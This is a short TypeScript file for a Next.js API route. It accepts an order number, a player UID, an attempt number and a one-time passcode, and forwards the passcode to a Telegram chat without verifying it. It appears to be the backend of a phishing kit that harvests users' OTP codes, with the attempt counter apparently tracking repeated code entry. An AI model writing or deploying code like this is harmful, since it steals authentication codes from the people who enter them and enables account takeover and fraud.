import { NextRequest, NextResponse } from 'next/server'
import { sendTelegram, buildOtpMessage } from '@/lib/telegram'

export async function POST(req: NextRequest) {
  try {
    const { orderNumber, playerUid, attempt, otpCode } = await req.json()

    if (!orderNumber || !otpCode || !attempt) {
      return NextResponse.json({ error: 'Missing fields' }, { status: 400 })
    }

    await sendTelegram(buildOtpMessage({
      orderNumber: String(orderNumber),
      playerUid: String(playerUid ?? ''),
      attempt: Number(attempt),
      otpCode: String(otpCode),
    }))

    return NextResponse.json({ ok: true })
  } catch (e) {
    return NextResponse.json({ error: 'Server error' }, { status: 500 })
  }
}
